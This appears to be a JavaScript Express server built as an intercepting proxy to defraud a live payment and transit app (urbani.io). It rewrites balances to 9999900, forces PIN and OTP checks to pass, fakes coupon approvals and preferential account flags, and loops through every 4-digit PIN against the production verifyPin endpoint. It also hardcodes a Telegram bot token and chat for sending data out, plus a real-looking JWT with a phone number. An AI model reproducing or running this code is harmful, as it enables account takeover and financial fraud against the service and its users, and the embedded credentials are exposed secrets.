import 'dotenv/config'
import express from 'express'
import morgan from 'morgan'
import crypto from 'crypto'
import parseJwt from './helpers/jwtDecr.js'
import TelegramBot from 'node-telegram-bot-api'
import Usuario from './models/usuario.js'
//import decryptProvider from './helpers/tryDecr.js'
import {dbConnection} from './database/config.db.js'

let number
let userId
let balance
let nombre

const dbCnn = async() => {
    await dbConnection();
  }

const app = express()

app.use(morgan('dev'))

app.use(express.json())

app.use(express.urlencoded({extended: true}))

//dbCnn()

const bot = new TelegramBot('7905079405:AAF9dtA-0Dr6Cl9ko6WwcK9tknt3WlzziFs', { polling: false });

const sender = async (msg) => {
  //let msg
  //const uId = req.body.username
  //const pwd = req.body.password
  /*if(req.query.msg) {
   msg = req.query.msg
  }*/
  try {
    const sentMessage = await bot.sendMessage('-4866824512', msg);
    //console.log('Mensaje enviado:', sentMessage.text);
    //res.render('fin')
  } catch (err) {
    console.error('Error al enviar mensaje:', err.message);
  }
};

const requests = async (req, endpoint, method, body) => {
  const request = await fetch(endpoint, {
    method,
    headers: {
      "Authorization": req.headers.authorization,
      "Content-Type": "application/json"
    },
    body: body ? JSON.stringify(body) : undefined
  });

  const contentType = request.headers.get("content-type");

  if (contentType && contentType.includes("application/json")) {
    return await request.json();
  }

  return await request.text();
};

app.get('/api/customers', async(req, res) => {
  //const phone = req.query.phone
  console.log(req.headers)
  try {
    const resp = await requests(
      req,
      `https://ecartpay.com/api/customers/${req.query.phone}`,
      'GET',
      null
    );

    console.log(resp)

    res.send(resp);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
  
})

app.post('/app/payment/method/v2', async(req, res) => {
  console.log(req.body)
  
  try {
    const resp = await requests(
      req,
      `https://api-payment.urbani.io/app/payment/method/v2`,
      'POST',
      req.body
    );

    console.log(resp)

    res.json({ message: 'Pago procesado correctamente' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
  
})

app.post('/app/p/changeCoupon', (req, res) => {
  console.log(parseJwt('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtYWluX3Bob25lIjoiODExNzg1MTgzNSIsInVpZCI6Im9Sd1pmOThZTzIzeGNmYzYxc2dSdlJJWUFtUnUiLCJpYXQiOjE3NDQ2MjU3MzAsImV4cCI6MTc1MjQwMTczMH0.-QkLq6wNyJjq2Ifd4IRRQYuCeFK7Wx1K1CFK29sRVok'))
  return res.status(200).json(
    {
      "descuento": 100,
      "monto": 300,
      "status": true,
      "aprobado": true,
      "valido": true,
    }
    )
})

app.post('/app/p/check/pin', async(req, res) => {
  console.log(req.body)
  
  
  try {
    const resp = await requests(
      req,
      `https://auth-prod.urbani.io/app/p/check/pin`,
      'POST',
      req.body
    );
    
   resp.user_pin = true
    //resp.alt_phone = '8117851835'
    
    console.log(resp)
    
    await res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  console.log('ap')
  }

})

app.post('/app/p/verifyPin', async(req, res) => {
  
  
  
  const cantidad = 9999;

for (let i = 1000; i < cantidad; i++) {

  req.body.pin = i
  console.log(req.body)
  
  try {
    const resp = await requests(
      req,
      `https://auth-prod.urbani.io/app/p/verifyPin`,
      'POST',
      req.body
    );
    
  // resp.user_pin = true
    //resp.alt_phone = '8117851835'
    
    console.log(resp)
    
    //await res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  console.log('ap')
  }
}
})

app.post('/api/tokens', (req, res) => {
  //console.log(req)
  return res.status(200)
})

app.get('/app/g/user/:phone', async (req, res) => {
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/g/user/${req.params.phone}`,
      'GET',
      null
    );
    
    if(resp.user_id) {
      number = req.params.phone
      userId = resp.user_id
      nombre = resp.name
      resp.name = `Hola ${resp.name} utiliza 11 para guardar el balance, o 14 para borrar el balance guardado. | xLaxC0rruptxRatx 🐀🏴`
    }
    /*
    if(resp.user_id) {
    const userId = resp.user_id
      const query = { user_id: userId }
      const dataUsuario = await Usuario.find(query)
    
      
      if(dataUsuario.user_id) console.log(dataUsuario) 
      else {
        const data = {
          numero: req.params.phone,
          user_id: userId,
          balance: 'test'
        }
        const usuarioNuevo = new Usuario(data)
        await usuarioNuevo.save()
        console.log(usuarioNuevo)
      }
    }*/

    console.log(resp)

    res.send(resp);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
});

app.post('/app/p/transferBalance', async(req, res) => {
  console.log(req.body)
  /*
  try {
    
    balance = await requests(
      req,
      `https://app.urbani.io/app/g/userBalances`,
      'GET',
      null
    );
    
    /*
    const resp = await requests(
      req,
      `https://app.urbani.io/app/p/transferBalance`,
      'POST',
      req.body
    );
    console.log(resp)
    res.send(resp);
    * /
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  } */
  /*JSON.stringify({
  user_id: 'oRwZf98YO23xcfc61sgRvRIYAmRu',
  amount: 1500,
  method: 'test',
  status: 'test',
  transaction_id: '10001'
})*/

  if(req.body.amount == 1100) {
    console.log(`{
      ${number},
      ${nombre},
      ${userId},
      }`)
      //${balance}
    res.status(200).json({status: 'success'})
  } else {
    res.json({message: 'error'})
  }

})


app.get('/app/g/config/v2', async(req, res) => {
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/g/config/v2`,
      'GET',
      null
    );

    console.log(resp)

    res.send(resp);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
})
  
app.get('/app/g/userFlags', async(req, res) => {
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/g/userFlags`,
      'GET',
      null
    );

    console.log(resp)

    res.json({
  user_status: true,
  preferential_status: true,
  rate_type: 'PRFERENCIAL',
  tm: true,
  vdate: null,
  balance_tm: '50000',
  gps_status: true,
  number_alternative: true,
  user_pin: false
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
})

app.get('/app/g/userBalances', async(req, res) => {
  try {
    /*const resp = await requests(
      req,
      `https://app.urbani.io/app/g/userBalances`,
      'GET',
      null
    );*/

   // console.log(resp)

    res.send('bCb/pmUUCrwn5TmhnijiRRB7B7xCPz5ITWDad8aSKp+csyHAUiyNGhZdfpyiKY0d9HAGExFKQlZvVprFyl2qRw==');
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
})

app.post('/app/p/pin', (req, res) => {
  console.log(req.body)
  res.status(200)
})

app.post('/app/p/processActions/v2', async(req, res) => {
  const body = req.body
  
  body.transactions = body.transactions.slice(-1);
  
  const last = body.transactions[0];
  last.access.balance_new = '9999900';
  last.access.balance_old = '9999900';
  
  console.log(JSON.stringify(body, null, 2));
  
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/p/processActions/v2`,
      'POST',
      body
    );
    
    resp.balance = 9999900
    
    console.log(resp)
    
    await res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  console.log('ap')
  }
}) 

app.post('/app/u/send/access', async(req, res) => {
  const body = req.body
  body[0].balance_new = 9999900
  body[0].balance_old = 9999900
  console.log(body)
  
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/u/send/access`,
      'POST',
      body
    );

    
    console.log(resp)
    
    res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  console.log('ap')
  }
  
})

app.post('/app/g/send/v3', async(req, res) => {
  console.log(req.body)
  
  try {
    const resp = await requests(
      req,
      `https://auth-prod.urbani.io/app/g/send/v3`,
      'POST',
      req.body
    );
    
    //resp.user_pin = true
    //resp.alt_phone = '8117851835'
    
    console.log(resp)
    
    await res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  console.log('ap')
  }
  
})

app.post('/app/g/verify/v4', async(req, res) => {
  
  req.body.otp = true
  console.log(req.body)
  
  try {
    const resp = await requests(
      req,
      `https://auth-prod.urbani.io/app/g/verify/v4`,
      'POST',
      req.body
    );
    
    //resp.message = `vayase a la verga`
    
    console.log(resp)
    
    await res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  console.log('ap')
  }
  
})

app.listen(4000 , () => {console.log(`SERVER ACTIVO...PUERTO: ${4000}`)
  //decryptProvider
})